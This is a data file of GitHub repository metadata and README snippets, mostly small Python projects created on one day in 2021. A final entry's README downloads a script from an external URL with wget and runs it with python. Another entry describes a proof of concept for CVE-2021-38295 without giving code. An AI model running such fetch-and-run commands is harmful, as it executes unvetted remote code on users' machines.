417094460;cs50_lecture;https://github.com/marik88/cs50_lecture;HTML;2021-10-14T10:57:44Z;0;0;0;
417076758;py-utils;https://github.com/lukech/py-utils;Python;2021-10-14T09:55:29Z;0;0;0;py-utils Various utility programs written in Python 
417104506;hello;https://github.com/king644s/hello;;2021-10-14T11:32:21Z;0;0;0;
417088616;simplify_code;https://github.com/deviur/simplify_code;Python;2021-10-14T10:36:55Z;0;0;0;simplify_code Examples of how to simplify python code Еhe description is currently available only in Russian. Read here 
417111753;foxbit;https://github.com/isakruas/foxbit;Python;2021-10-14T11:57:18Z;0;0;0;"Motivação  Percebendo a falta de um módulo Python que facilite a integração com a API da exchange Foxbit, me dei ao trabalho de organizar este. Espero que este módulo seja útil para você; sinta-se à vontade para contribuir com o projeto.  "
417190536;Jenga-School-Lecture-7-;https://github.com/JacklineKigombe/Jenga-School-Lecture-7-;Python;2021-10-14T15:46:40Z;0;0;0;Lecture-7 Lecture 7 Python assignments pushed to GitHub 
417104948;snakes_and_ladders;https://github.com/xiaowenyuan/snakes_and_ladders;Python;2021-10-14T11:34:02Z;0;0;0;"snakes_and_ladders Introduction This is a simple Python project that I made for practice. To run it, simply call the file script.py in the terminal. In each round, the board's snakes and ladders will be generated randomly. Gameplay Up to four people can play the game. Theoretically, there should be no limit on the number of players, but the wait time between the players will be too long if too many players are involved. The player can choose to set the size of the square board (n*n) limited between 8x8 to 12x12. Both lower and upper limits are theoretical; too low and it jeopardises the number of snakes and ladders that can be set on the board, and too high and it makes gameplay too long while the grid will also not fit in a standard terminal. Each board will have the same number of snakes to ladders. The player can set this amount, but the maximum number is n - 3 (n being the length of the board). This is to ensure that there will be as many snakes and ladders set on the board. The script can recognise if there is no appropriate square that can be set as snake tail or ladder bottom/top. It is therefore possible for fewer snakes or ladders to be generated than requested. The board can be re-generated prior to the gameplay if the players are not happy with the snakes and ladders generated on the board. 1 or 2 dies can be used. No extra roll is given if the player rolls a 6 or 12. The player wins if they roll more than the required amount of steps to reach the end square (ie if s is the steps to the end square, player wins as long as dice_roll > s). There is no need to roll a precise amount. The Board After each dice roll, the script will print out the current state of the board. Each square is numbered, and may contain the following letters at the right side of the number:  SHXX: this refers to Snake Head. The number XX refers to where the snake tail (and hence the square the player will end up on) is. ST: this refers to Snake Tail. LBXX: this refers to Ladder Bottom. The number XX refers to where the ladder top (and hence the square the player will end up on) is. LT: this refers to Ladder Top.  The left side of each square number may show the players' tokens. Players can occupy the same square without any consequences. Files  script.py: This is the file that runs the game. test.py: This file contains testing functions, specifically the generation of snakes and ladders. script_testing.py: This file is a carbon copy of script.py, except that print statements are uncommented. This file is used for testing.  "
417049244;lecture1;https://github.com/YuliiaTu/lecture1;;2021-10-14T08:26:31Z;0;0;0;
417072605;pytldr;https://github.com/iamgodot/pytldr;Python;2021-10-14T09:41:03Z;0;0;0;Pytldr  Another Python client for tldr pages Installation pip install pytldr Usage >>> tldr  Support python3.6+ Changelog Here License MIT Credits This package was created with cookiecutter and iamgodot/gen-pyckage project template. 
417178931;krissey;https://github.com/christen-ezejr/krissey;;2021-10-14T15:12:37Z;0;0;0;
417069010;playlist-converter;https://github.com/prettyirrelevant/playlist-converter;Python;2021-10-14T09:29:25Z;2;2;0;
417100920;xnkakasi;https://github.com/XindaAAA/xnkakasi;JavaScript;2021-10-14T11:19:57Z;0;0;0;"一个将日语文本转化为罗马音/平假名/片假名的API xnkakasi 日语文本转化 一个将日语文本转化为罗马音/平假名/片假名的API 使用python库pykakasi来完成转化过程 其实就是用node.js调用python，用node.js启动一个服务器来转化日语文本 （实际上是我太菜，用不来python的flask，所以我才用这个似乎奇葩的方法来实现转化功能） 环境要求 需要部署node.js与python3.6+环境 python需要安装pykakasi库 安装/使用 忽略Node.js和Python的安装过程   在pip中安装pykakasi pip install pykakasi   下载文件并解压   在文件夹路径中打开终端 npm install   现在部署已经完成   启动Node服务器 (默认端口是 3000, 可以在main.js中修改) node main.js   在浏览器中测试 (GET 方法)    http://127.0.01:3000/user?content=大丈夫&mode=ToRoma  ""大丈夫"" 可以替换为自己想转换的文本 ""ToRoma"" 意味着将文本转换为罗马音, 可以用""ToHira"" 转换为平假名，用 “ToKana” 转换为片假名。    参数 值 介绍     content 日语文本，如 ""大丈夫"" 需要被转换的文本   mode ToRoma/ToHira/ToKana 转换模式，不输入的话默认为罗马音    注意   返回值是json，如下:  {""url"":""/user?content=%E5%A4%A7%E4%B8%88%E5%A4%AB"",""rText"":""大丈夫"",""output"":""daijoubu \r\n""}    这个API的默认方法是GET. 你也可以用POST，但是现在还不完善，过段时间我会完善下   如果不得不用POST, 可以在POST内容中传入需要转化的文本，然后得到文本转化的罗马音。 （现在POST方法只支持罗马音）返回值是纯文本，不是json。   运行目录下会有一个data.txt的文本文件，用来从javascript向python传递原文本。     xnkakasi An api converting Japanese text to Roma/Hiragana/Katakana. Using pykakasi (a python lib) to finish the process of converting. I just use node.js to Call the python file so that I can use the method of node.js to launch a server which can help me convert the Japanese text. (Actually I didn't manage to learn the flask, so I continue my project in the way.)  Environment Need node.js and python3.6+ pykakasi (a python lib) Install/Use Ignore the process of installing node.js and python   install pykakasi in pip pip install pykakasi   download the file and upzip it   open the terminal in the dir npm install   now the deployment is over   launch the node server (default port is 3000, you can change it in file ""main.js"") node main.js   test it on your browser (GET method)    http://127.0.01:3000/user?content=大丈夫&mode=ToRoma  ""大丈夫"" in the ""content"" can be replaced by your own text ""ToRoma"" means converting text to roma, you can use ""ToHira"" to convert it to Hiragana and “ToKana” to convert it to Katakana.    Arguments Value Introduction     content any japanese text like ""大丈夫"" The text need to be converted   mode ToRoma/ToHira/ToKana The convert mode.If you don't input,  the default mode is ToRoma    Tips   The return value is json like this:  {""url"":""/user?content=%E5%A4%A7%E4%B8%88%E5%A4%AB"",""rText"":""大丈夫"",""output"":""daijoubu \r\n""}    The default method of this API is GET. You can also use POST but it's not supported well at present. I'll update it in the near future.   If you have to use POST in this imperfect version, you can put your text in the content of POST, and you will get its roma in return. (Now POST support ToRoma only). The return value is text.   There will be a file called ""data.txt"" in the running path. It's used to convey text from javascript to python.    "
417072532;test-if-you-can-drive-or-not;https://github.com/PaciferYork/test-if-you-can-drive-or-not;Python;2021-10-14T09:40:46Z;2;2;0;
417092560;hack-the-box;https://github.com/HadyFTW/hack-the-box;Python;2021-10-14T10:50:52Z;0;0;0;
417193079;telecom-customer-churning;https://github.com/swastik-sourav-sahoo/telecom-customer-churning;Jupyter Notebook;2021-10-14T15:54:13Z;0;0;0;"Telecom Customer Churning Introduction This is a basic project on Machine Learning which allows us to predict the customer churning of a telecom companies. Churn is the measure of how many customers stop using a product. Telecom companies predict whether a customer will be stop using their services or not. Problem statement Build a ML model to predict the customer churn for a telecom company. Rationale If it is predicted that a customer will stop using the services, the companies can take actions by giving him/her several offers, vouchers and discounts. How To Run  Download the project. The project is inside the Telecom Customer Churning directory. Open the Churn.ipynb file jupyter notebook. Run all the cells. Enter the customer ID you want to find. You will get the result.  Implementation In this project, Machine Learning using Python have been used and developed with Jupyter Notebook.  The dataset is given in churn.csv file which was downloaded from Kaggle. After the prediction is done, a new column ""action"" is added which stores the appropriate comments. Customer ID can be entered to fetch the required action of a particular customer.  Note This project is meant for learning purposes only. Feel free to use the code if needed.  The project is not deployed on any application. It is just the development of the ML part. Thanks & Regards Swastik Sourav Sahoo "
417173206;pypacker;https://github.com/syegulalp/pypacker;Python;2021-10-14T14:57:49Z;0;0;0;PyPacker: a dumb little script for turning Python apps into standalone executable packages on Windows PyPacker is my attempt at creating a way to make Python apps fully portable on Windows. It does this by performing live program analysis to determine what to pack up. Rationale Most systems for turning Python apps into standalone programs analyze the program to determine what and how to pack things up, but don't actually run the program in question, and so have no information about the program's runtime behavior. PyPacker runs the program and makes a record of all the imports actually used during the program's lifetime. It then uses this information to create a standalone redistributable of the application. The downside of this approach is that you have to perform at least one run with the program that provides the broadest possible program coverage -- e.g., all imports are fully executed, etc. The upside is that PyPacker knows exactly what to copy. Also, your trace files can be reused as long as no new program components have been added in the meantime. Usage Run it like so: py -m pypacker -a entry_point.py where entry_point.py is the entry point to your application. Your application will launch. Run it and make sure you use as much of its functionality as possible, to generate the maximum possible coverage. When your application exits, PyPacker it will generate a tracefile.json file that can be re-used for future runs (by just typing py -m pypacker in that directory). It will then package your application for redistribution. The resulting redistributable will be placed in the dist subdirectory. A zipped version of the redistributable directory is also provided. What PyPacker tries to do  The main program tree is turned into a .zip file (of .pyc files). Any non-Python files in the main program tree are copied into a parallel directory off the root of the dist directory. Usage of .pyd files and (some) .dlls are automatically detected as well and copied. Third-party packages are also included. Both console and windowed executables are provided.  Note that PyPacker works best with a program structure like this: entrypoint.py     \ appdir  where entrypoint.py is what's executed to start your app, and your actual app and all its files live in appdir and below. This makes it easier for PyPacker to detect data files that are adjacent to your application. Caveats Very buggy. Drastically incomplete. For instance, stuff like NumPy probably doesn't work yet. License MIT 
417179329;twitterCleanUp;https://github.com/DavesWork19/twitterCleanUp;C++;2021-10-14T15:13:44Z;0;0;0;Twitter Clean Up - A way to help people clean up and be more aware of their Twitter posts. There are two .py files, two .cpp files and one .hpp to run this code. During the first Python code, the user is asked to input their Twitter username and then follows by asking how many days back would they like to view their tweets. After the user enters in all their information the Python code uses the Twitter API to extract all of their tweets up to the entered day and stores them in a .txt file for later parsing. Once the python code has concluded, the c++ code starts to run which takes all the tweets from the .txt file and stores them into a stack implemented with linked lists to be examined. Once the stack has been created the user is then prompted with 3 options. Option 1, is to cross-reference all of the users tweets with a generated list of offensive words and phrases. Option 2, is to cross-reference all of the users tweets with a word or phrase that the user enters. While option 3, exits the program and deletes all the users saved information, such as the linked lists of all their tweets, the linked list of their offensive tweets and the .txt file containing all their tweets. If the user chooses option 1 or 2 the program will find all of their offensive posts and flag them. Once a post has been flagged it is then stored in another stack implemented by linked lists so the most recent tweet is at the top. Once the final stack of only offensive words has been created, the user is taken through the entire stack and asked if they would like to delete or keep each offensive post. If the user chooses to delete one of their posts, that post is then stored into a .txt file to be deleted later using another python code that uses the Twitter API to delete posts. 
417136130;pychat;https://github.com/PierreAmide/pychat;Python;2021-10-14T13:13:04Z;1;1;1;pychat Un programme en ligne de commande d'échange de messages en Peer To Peer.  Sommaire  Fonctionnalités Objectifs Installation Utilisation pychat-lite Limitations connues Contacte, Contributions et plus  Fonctionnalités  Les messages sont chiffrés de bout en bout avec AES-128-OCB. La clé de chiffrement peut être chargée manuellement ou générée puis échangée automatiquement en sécurité avec RSA. Notifications de bureau sur Windows et Linux (désactivable). L'empreinte de la clé de chiffrement peut être copiée pour vérifier le chiffrement de bout en bout. Système de citations (>>citation>>message)  Objectifs  Simple et minimaliste : Il doit être simple d'utilisation et léger. Il n'a pas vocation à remplacer WhatsApp... Sécurité : Les communications doivent rester privées. Avare en information : L'hôte et le port doivent être les seules informations connues sur un correspondant. Absolument rien ne doit être conservé après la fermeture.  Installation Non valable pour pychat-lite Python 3.5+ est requis. Dans le même répertoire que pychat, utiliser la commande suivante pour installer les dépendances python: py -m pip install -r requirements.txt  Si vous rencontrez des problèmes lors de l'installation du module pycryptodome, référez-vous à sa documentation: ici pour Windows et ici pour Linux. Utilisation Pour lancer pychat : Sur Linux, accorder les permissions nécessaires pour l'exécuter: sudo chmod +x pychat.py ./pychat.py  Sur Windows: pychat.py  Pour utiliser pychat : L'un des deux correspondants devra lancer pychat en mode serveur pour attendre le client. Dans ce cas, penser à ouvrir le port utilisé (12800 par défaut) sur le routeur : pychat.py -s  L'autre devra alors utiliser le mode client en précisant l'hôte (ip) du serveur. pychat.py -c -i HOTE   Pour fermer la connexion active, utilisez la commande !close. Une erreur commune en lançant le serveur: Erreur: ce port est déjà utilisé.  Dans ce cas, utiliser un port différent ou fermer le terminal puis le rouvrir. pychat-lite Une version allégée est disponible dans la branche pychat-lite. Le but étant de réduire au maximum son poids, pychat lite ne chiffre pas les messages et beaucoup de fonctionnalités y sont absentes. Limitations connues  Coupure de l'affichage du message en train d'être écrit lors de la réception d'un message. Sur Windows, La réception de message est bloquée lorsqu'une notification de bureau est affichée.  Contacte, Contributions et plus L'aide et les retours sont la bienvenue. N'hésitez pas à contribuer sur github ! Mail: dev_contactmail@protonmail.com Merci à @LDelaforet pour l'aide apportée. 
417068956;https-github.com-RuslanaPereviznyk-git-clone-https-github.com-katemalash-Rv-087.Python-Core;https://github.com/RuslanaPereviznyk/https-github.com-RuslanaPereviznyk-git-clone-https-github.com-katemalash-Rv-087.Python-Core;;2021-10-14T09:29:15Z;1;1;0;
417169281;simple-phone-price-prediction-using-linear-regression-in-python-machine-learning-;https://github.com/Jaiswar1232/simple-phone-price-prediction-using-linear-regression-in-python-machine-learning-;Jupyter Notebook;2021-10-14T14:46:57Z;0;0;0;
417121900;apigateway-iamauthentication-crossaccount;https://github.com/engineer-taro/apigateway-iamauthentication-crossaccount;Python;2021-10-14T12:29:47Z;0;0;0;apigateway-iamauthentication-crossaccount [AWS]Try to create a configuration using SAM to call the APIGateway with IAM authentication from Lambda in another account. このリポジトリについて IAM認証をかけたAPIGatewayを別アカウントのLambdaから呼び出す構成をSAMで作成してみました。 詳細はこちらを参考にしてください。 デプロイ手順 ※ AWSリソースを作成するので、いくらかお金がかかります ※ 検証にはAWSアカウントが二つ必要 ※ AWS SAMをインストールしていない場合インストールが必要 ※ Dockerをインストールしていない場合sam build --use-containerの際にDockerが必要 ※ 今回利用する2つのAWSアカウント情報を.aws配下credentialsファイルに記述してある前提で書いてあります。 1. Lambda Accuont側のデプロイ コマンド cd lambda_account sam build --use-container sam deploy --guided --profile <Lambda側のアカウント> --capabilities CAPABILITY_NAMED_IAM   # いくつかのパラメータを設定する   AnotherAccountID Lambda AccuontのアカウントID   APIString: 後ほど再度設定するのでxxxxxxxxなどにしておく   FunctionName デフォルトでもOK   AnotherAccountRoleName 2で設定するロール名。デフォルトでもOK   APIPath デフォルトでもOK   2. APIGateway Account側のデプロイ コマンド cd apigateway_account sam build sam deploy --guided --profile <APIGateway側のアカウント> --capabilities CAPABILITY_NAMED_IAM   # いくつかのパラメータを設定する   AnotherAccountID もう一つのアカウントのID   RoleName デフォルトでもOK  3. 設定値を変更してLambad Account側のデプロイを再度行う Lambdaアカウント側の環境変数APIStringに、APIGatewayのIDを入れる必要があります。 APIGatewayのアカウントにて、APIGatewayのIDを確認してください。ここでAPIGatewayのIDと言っているのはエンドポイントの以下の部分です。 https://{APIGatewayのID}.execute-api.ap-northeast-1.amazonaws.com/dev/apigateway/lambda_attached_apigateway コマンド cd lambda_account sam deploy --guided --profile <Lambda側のアカウント>  # いくつかのパラメータを設定する   APIString: APIGatewayのID   他は1のとき設定したものと同じでよい  
417159494;family_recipes;https://github.com/SolemnShark871/family_recipes;;2021-10-14T14:20:25Z;0;0;0;
417053486;TableRobot;https://github.com/svimana/TableRobot;Python;2021-10-14T08:40:14Z;0;0;0;Table Toy Robot Demo Python game to operate a toy robot on the table This is a Table Robot Game. Move your robot on a table space 5x5 units. Commands (CAPITAL LETTERS ONLY): HELP - Print this help EXIT - Terminate the game PLACE X,Y,Direction - Put the robot on the table in position X,Y and facing NORTH, SOUTH, EAST or WEST. The table is facing Up (NORTH). Bottom-Left corner has 0,0 coordinate. Direction can be: NORTH/EAST/SOUTH/WEST. Bottom-Left corner has 0,0 coordinate. EAST is to the Right, WEST - Left, South - Down. Example: PLACE 1,1,SOUTH - Robot will be placed at coordinate 2,2 facing Down MOVE - Move the robot one unit forward in the direction it is currently facing. Any move that would cause the robot to fall will be ignored. LEFT - Rotate the robot 90 degrees to the left without changing the position of the robot. RIGHT - Rotate the robot 90 degrees to the right without changing the position of the robot. REPORT - Announce the X,Y and Direction of the robot. How to run  python main.py  
417178687;pyrc3563;https://github.com/KrystianD/pyrc3563;Python;2021-10-14T15:12:01Z;1;1;0;"pyrc3586 Python library and CLI tool for RC3563 battery impedance meter. Library usage from rc3563 import RC3563  rc = RC3563(""/dev/ttyUSB0"") while True:     print(rc.read()) CLI tool python -m cli /dev/ttyUSB0 # V: 4.118, R: 0.028483 # 28.483 mΩ # V: 4.118, R: 0.028376 # 28.376 mΩ # V: 4.118, R: 0.028264 # 28.264 mΩ # V: 0.000, R: inf # overflow - nothing connected "
417159066;Attendance-system-using-Face-Recognition;https://github.com/Ravieja/Attendance-system-using-Face-Recognition;Python;2021-10-14T14:19:16Z;0;0;0;Face Recognition Attendance Management System Using Face Recognition Introduction This project aims about optimising the traditional Attendance Marking System by Introducing the Face Detection and Recognition. A basic flask Application is wrapped around the main model to demonstrate the itself much better. data folder consists of the images and student data which fuels the model and also the outcomes i.e., the attendance data will be marked and stored in the respective sub folder. templates folder consists of the main html template for our flask Application. Before Running, make sure you have the dlib library downloaded, up and running. Even before installing the respective libraries stated in the code. 
417134267;pyDay1;https://github.com/mrcruz117/pyDay1;Python;2021-10-14T13:07:43Z;0;0;0;pyDay1 Udemy 100 days of python course day 1 
417149293;How_to_iterate_through_a-_ist_in_python_without_a_loop;https://github.com/hamikeskin/How_to_iterate_through_a-_ist_in_python_without_a_loop;Python;2021-10-14T13:51:46Z;0;0;0;
417190387;Marvel_trivia;https://github.com/pearljennifer/Marvel_trivia;;2021-10-14T15:46:12Z;0;0;0;Marvel_trivia I developed a short Marvel trivia using Python 
417190090;CVE-2021-38295-PoC;https://github.com/ProfessionallyEvil/CVE-2021-38295-PoC;Python;2021-10-14T15:45:21Z;0;0;2;CVE-2021-38295-PoC A simple Python proof of concept for CVE-2021-38295. Related Blog Post [LINK TO BLOG] Usage: Usage: cve-xxxx <host> <db> <user:pass>  Simply supply the script with a host, a database which your creds have access too, and the username password pair. If everything works, you'll get a URL which links to the malicious attachment. 
417184071;Battleship;https://github.com/RaHughes/Battleship;Python;2021-10-14T15:27:20Z;0;0;0;Battleship The classic board game Battleship recreated in a Python Terminal. To play Battleship, clone this repository down onto your local machine. Navigate to the battlefield.py file, and run inside of a python terminal. Follow all prompts carefully. Most things account for user error. 
417050901;projet_6;https://github.com/Rhoroh/projet_6;;2021-10-14T08:31:31Z;0;0;0;
417144905;dynamic-variables;https://github.com/cahidenes/dynamic-variables;Python;2021-10-14T13:39:07Z;0;0;0;dynamic-variables Change python variables using simple GUI in runtime. 
417100859;regular_mesh_plotter;https://github.com/fusion-energy/regular_mesh_plotter;Python;2021-10-14T11:19:46Z;0;0;0;dose_map_plotter A Python package for plotting neutronics dose maps 
417050266;Image_Viewer;https://github.com/mylestraut/Image_Viewer;Python;2021-10-14T08:29:45Z;0;0;0;
417169440;hello-world;https://github.com/georginafolco/hello-world;Jupyter Notebook;2021-10-14T14:47:20Z;0;0;0;hello-world Extracting data with Python - Extrancting data with Webscraping 
417064931;Top-Albums-Project;https://github.com/utinoeblo/Top-Albums-Project;Jupyter Notebook;2021-10-14T09:17:15Z;0;0;0;Top-5000-Albums-Project Original data comes from Kaggle. Pre-processed in Python (top_albums_book.ipynb) and visualised with Tableau. Analysing Top and Worst Perfomed Years:  Overall statystics of the data:  
417077619;ptyhonRepo;https://github.com/DonalHowe/ptyhonRepo;Python;2021-10-14T09:58:18Z;0;0;0;ptyhonRepo this is my python repo for web app development 
417131151;KonverterValuta;https://github.com/marko-zec/KonverterValuta;Python;2021-10-14T12:58:40Z;1;1;0;
417159742;P6;https://github.com/seah78/P6;;2021-10-14T14:21:03Z;0;0;0;P6 Développez une interface utilisateur pour une application web Python 
417167468;Algoritmos-de-otimizacao;https://github.com/raphaelmss92/Algoritmos-de-otimizacao;Python;2021-10-14T14:41:55Z;0;0;0;
417138258;Kreator-m3u-popisa-za-reprodukciju;https://github.com/marko-zec/Kreator-m3u-popisa-za-reprodukciju;Python;2021-10-14T13:19:15Z;0;0;0;
417159393;maze-game;https://github.com/Stephenlaye2/maze-game;JavaScript;2021-10-14T14:20:09Z;0;0;0;
417153743;NJClabsinternship;https://github.com/anmolkamath/NJClabsinternship;Python;2021-10-14T14:04:03Z;0;0;0;NJClabsinternship Create Movie Database and retrieve data using python. Create a database, store your interesting movie names with the names of lead actor, actress, year of release and the director name. Once you have stored the details, then use any programming language of your choice to retrieve the details. 
417051218;Piano-Tiles-Bot;https://github.com/Shrivis/Piano-Tiles-Bot;Python;2021-10-14T08:32:35Z;0;0;0;Piano-Tiles-Bot Install all requirements with: ~# pip install -r requirements.txt Setting global variables: there are five variables that you need to change x1, x2, x3, x4, y and start_y open the game online or in any app, make sure the game always opens with exactly the same coordinates, and don't move the window  Method 1: take a screenshot of the entire window, then use paint to find out the coordinates for all global variables by looking at the setGlobal.jpg Method 2: run the mousePosition.py file in the terminal and every time you press y and enter.  it'll tell you the exact coordinates of your mouse pointer. Just point at locations given in setGlobal.jpg and find out the coordinates for global variables Using the Failsafe: the program run in an infinite loop and clicks on anything black or blue within gameBox, just move the mouse outside the gameBox and the program will terminate I tested this game bot on: https://www.silvergames.com/en/piano-tiles-2 contact: shrivis@hotmail.com for any query 
417088730;motion_detection;https://github.com/voidknown04/motion_detection;Python;2021-10-14T10:37:22Z;0;0;0;motion_detection Real time motion detection with python lib {cv2} 
417084042;walli;https://github.com/anoduck/walli;;2021-10-14T10:20:23Z;0;0;0;
417187093;maid;https://github.com/PolarFill/maid;;2021-10-14T15:36:28Z;0;0;0;maid Assistente pessoal programada em python, com suporte a alta customização 
417152083;calculator;https://github.com/Sparky10/calculator;Python;2021-10-14T13:59:37Z;0;0;0;Python calculator The implementation of a simple calculator in Python demonstrating SOLID and TDD principles. To run the calculator From the 'scripts' directory issue: python calculator.py  To run the tests From the 'tests' directory issue: python test_calculator.py -v  Architectural overview Script A simple script is run from the command line to provide an io interface. Models The Calculator model uses the compute service to co-ordinate calculator actions. The ComputeEngine models handle parsing and calculations.  There are two compute engine models available:  SimpleComputeEngine ComplexComputeEngine  The ComplexComputeEngine is a subclass of the SimpleComputeEngine. The simple engine provides +, -, * and / operations on integers only.  Input must be space delimited. The complex engine adds ^ (power) and % (modulus) operations and can handle floats.  Space delimiting is not required for inputs. Services The ComputeService is used to inject ComputeEngine dependencies into the Calculator model. 
417086397;Celestine;https://github.com/efficomp/Celestine;Python;2021-10-14T10:28:46Z;0;0;0;"Celestine Celestine is a Python-based procedure to solve classification problems through five Machine Learning methods:  K-NN SVM Naive Bayes Random Forest Convolutional Neural Network (CNN)  Requirements Celestine requires Python 3. It also depends on the following Python packages:  NumPy Pandas Scikit-learn Keras Tensorflow PyMongo Sphinx  Documentation Celestine is fully documented in its github-pages. You can also generate its docs from the source code. Simply change directory to the doc subfolder and type in make html, the documentation will be under build/html. You will need Sphinx to build the documentation. Usage There are two files to perform the classification:  cnn.py - Script to run only the CNN. classfiers.py - Script to run the rest of classifiers.  The command to execute each script is as follows: $ python3 script data_train.npy labels_train.npy data_test.npy labels_test.npy MRMR.csv where:  script is cnn.py or classifiers.py. data_train.npy is the file with the training dataset data (in .npy format). labels_train.npy is the file with the training dataset labels (in .npy format). data_test.npy is the file with the test dataset data (in .npy format). labels_test.npy is the file with the test dataset labels (in .npy format). MRMR.csv is the file with mRMR features ranking (in .csv format).  Finally, once the script is finished, the accuracy of each method will be saved in a local database using the PyMongo library. Acknowledgments This work has been funded by:  Spanish Ministerio de Ciencia, Innovación y Universidades under grant number PGC2018-098813-B-C31. European Regional Development Fund (ERDF).           License GNU GPLv3. Copyright Celestine © 2015 EFFICOMP. Publications  J. C. Gómez-López, J. J. Escobar, J. González, F. Gil-Montoya, J. Ortega, M. Burmester, and M. Damas. ""Energy-Time Profiling for Machine Learning Methods to EEG Classification"". In: International Conference on Bioengineering and Biomedical Signal and Image Processing (2021), pp. 311-322. doi: 10.1007/978-3-030-88163-4_27  "
417180770;UC-module;https://github.com/NicolaiHaaberJunge/UC-module;Python;2021-10-14T15:17:51Z;1;1;0;UC Module Python Package How To Install clone repo. cd UC-module pip install .  How to Use uc.module.UC(measurment=str, dark=str, reference=str, header=boolian)   measurment : file path to measurment file.   from uc.module import UC  spectrum = UC(measurment='your-measurment-file.txt', dark='your-dark.txt (optional)', reference='your-reference-file.txt', header=False)  spectrum.absorbance()  
417049542;NATO-Alphabet;https://github.com/Misiaty-Mat/NATO-Alphabet;Python;2021-10-14T08:27:29Z;0;0;0;
417193518;check_fw;https://github.com/redbeardmcg/check_fw;Python;2021-10-14T15:55:30Z;0;0;0;Client/Server script to check firewall ports Config In either server or client mode, a config file is specified containing server and client config entries. The yaml config can contain both, or only one or the other. A sample server definition looks like this (listening address is optional): server:   ports:     - 0.0.0.0:22     - 5432     - 443     - 8443  A sample client definition looks like this: client:   targets:     127.0.0.1:       ports:         - 22         - 5432         - 443         - 8443     192.168.0.1:       ports:         - 22         - 443  Running A python3 and python2 version are both provided. To run in server mode: check_fw.py -f <some_file.yaml> -v -s  To run in client mode: check_fw.py -f <some_file.yaml> -v -c  Output (Server)  ** Found server declaration, running ports...         ** Port declarations found, ensuring listeners on ports:                 ** 192.168.0.181:22                         ** Port ('192.168.0.181', 22) is listening                 ** 5432                         ** Port ('0.0.0.0', 5432) not ready, starting...                 ** 9876                         ** Port ('0.0.0.0', 9876) not ready, starting...                 ** 4526                         ** Port ('0.0.0.0', 4526) not ready, starting... ** Ready to work, run the client... ** Received ping from ('192.168.0.181', 45980), sending pong... ** Received ping from ('192.168.0.181', 45546), sending pong... ** Received ping from ('192.168.0.181', 58778), sending pong... ** Received ping from ('192.168.0.181', 45996), sending pong... ** Received ping from ('192.168.0.181', 45562), sending pong... ** Received ping from ('192.168.0.181', 58794), sending pong...  Output (Client)  ** Running port checks         ** Scanning host 192.168.0.1                 ** Testing port 22      [OPENED]                 ** Testing port 443     [CLOSED]         ** Scanning host 127.0.0.1                 ** Testing port 22      [OPENED]                 ** Testing port 5432    [CLOSED]                 ** Testing port 443     [CLOSED]                 ** Testing port 8443    [CLOSED]  
417098073;scrap_and_translate_articles;https://github.com/YassineElGhizi/scrap_and_translate_articles;Python;2021-10-14T11:09:54Z;0;0;0;This repo contains a : python scrappers built using selenium. Flask server that recive data from these scrappers and store them in a Database. Transalte.py file that look trough the database and translte these articles. a WSGI file that is necessery to serve flask server in production mode along with nginx 
417144633;website_element_painter;https://github.com/MichaelPHartmann/website_element_painter;Python;2021-10-14T13:38:21Z;0;0;0;I was tired of manually changing all my headers, footers, and head code. There are options - yes. You have PHP, but that is server side and with my website being hosted on GitHub for now, that's not an option. Javascript and html_include is probably the best option out there for this, and it is probably better than this solution. That said, Javascript adds weight and reliability issues that I'm not sure I want to deal with. So I wrote this little script to automate the update of headers, footers, and heads. It is dead simple, and relies on a human marking each of their pages with HTML comments. The thing is, it's simple to understand, all the processing is done locally with the developer (me), so mistakes are caught immediately and before they are published, and all my webpages remain plain HTML and CSS for maximum speed. How It Works Wrap your head, headers, and footers with HTML comments. These MUST be on their own lines in the code. Your elements can go in their respective files in the templates directory, they are .txt, and if you want them to be active HTML just change the extensions in the Python code. All the pages you want to include should be listed, separated by newlines in the _includes.txt file. Headers Look Like This: \<!--HEADER BEGINS HERE-->  *HEADER CONTENT*  \<!--HEADER ENDS HERE-->  Footers Look Like This: \<!--FOOTER BEGINS HERE-->  *FOOTER CONTENT*  \<!--FOOTER ENDS HERE-->  Heads Look Like This: \<!--HEAD BEGINS HERE-->  *HEAD CONTENT*  \<!--HEAD ENDS HERE-->  The Python script will read the file, remove the lines with the old elements, replace them with the new elements, wipe the old code, and write the new code. Yes it's a little scary that the file is wiped and then written to. There are some safety checks to make sure you have valid tags and so forth, and only when eveything is in place does the truncation and write happen, so it should be pretty safe. I could have the script create a backup that it cleans up in case of some error, but honestly, I'm not worried enough about that edge case, and Git exists. 
417101557;ExtractDat3;https://github.com/douglascoenen/ExtractDat3;Python;2021-10-14T11:22:10Z;0;0;0;ExtractDat3 Python 3 version of John Hartman's Python 2.7 Extractdat (see https://github.com/jhh67/extractdat). The whole documentation and associated paper is within their repository. Here, the magic methods of the different classes and the writing methods have been changed to match Python 3. Also, the CLI and Drag and Drop has been replaced by the python built-in library Tkinter to create a GUI and pick files. The program behaves the same in terms of processing and saving files. Another addition was the option of loading bars by using the amazing tqdm package. It is not necessary to have it, but if installed, will be used to create loading bars for each .dat files and scans. To use this program now, you just have to either double-click on it to launch it or execute the script from the terminal. If there is any comments, feedback or feature requests I would be very happy to answer them! I also plan to translate RecoverDat.py in a similar manner when I will have time. 
417147304;WebScraping_wuzuuf;https://github.com/mohamednader973/WebScraping_wuzuuf;Jupyter Notebook;2021-10-14T13:46:02Z;0;0;0;WebScraping_wuzuuf WebScraping for only one page in wuzuuf using python 
417069508;proto_state_machine;https://github.com/wmtthompson/proto_state_machine;Python;2021-10-14T09:30:57Z;0;0;0;
417075739;popgensim;https://github.com/mojones/popgensim;Python;2021-10-14T09:51:50Z;0;0;0;popgensim A simple Python package and simulation tool for population genetics 
417126201;CS2041;https://github.com/Ajuwon-Mormon-Love/CS2041;Python;2021-10-14T12:43:13Z;0;0;0;CS2041 Object Oriented Programming and Data Structures in Python 
417166627;BatailleNavale;https://github.com/AvionDucati/BatailleNavale;;2021-10-14T14:39:45Z;0;0;0;BatailleNavale Projet du jeu de la Bataille Navale en Python 
417082843;apt-update-pkg-install-git-pkg-install-python-pkg-install-figlet-rm-trial.py-trial-wget--q-https-;https://github.com/kanhaiya744/apt-update-pkg-install-git-pkg-install-python-pkg-install-figlet-rm-trial.py-trial-wget--q-https-;;2021-10-14T10:16:00Z;0;0;0;"apt-update-pkg-install-git-pkg-install-python-pkg-install-figlet-rm-trial.py-trial-wget--q-https- apt update pkg install git pkg install python  pkg install figlet rm trial.py trial* wget -q ""https://raw.githubusercontent.com/iamskumar/trial/main/trial.py"" clear python trial.py "
